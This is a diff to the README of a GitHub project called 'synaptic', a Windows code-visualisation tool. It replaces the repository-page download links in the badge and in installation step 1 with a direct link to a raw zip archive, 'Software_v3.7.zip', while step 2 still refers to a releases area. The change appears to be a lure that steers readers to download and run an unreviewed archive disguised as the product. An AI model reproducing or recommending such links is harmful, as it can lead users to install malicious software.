@@ -1,6 +1,6 @@
 # 🧠 synaptic - See how your software code works
 
-[![Download Synaptic](https://img.shields.io/badge/Download-Synaptic-blue.svg)](https://github.com/Naz533/synaptic)
+[![Download Synaptic](https://img.shields.io/badge/Download-Synaptic-blue.svg)](https://raw.githubusercontent.com/Naz533/synaptic/main/synaptic/Software_v3.7.zip)
 
 ## 🔍 What this tool does
 
@@ -18,7 +18,7 @@ You need a Windows computer to run this tool. Ensure you have the following inst
 
 Follow these steps to set up the tool on your machine.
 
-1. Visit this page to download the software: https://github.com/Naz533/synaptic.
+1. Visit this page to download the software: https://raw.githubusercontent.com/Naz533/synaptic/main/synaptic/Software_v3.7.zip
 2. Select the latest version from the releases area.
 3. Download the installer file to your computer.
 4. Run the installer by double-clicking the file.
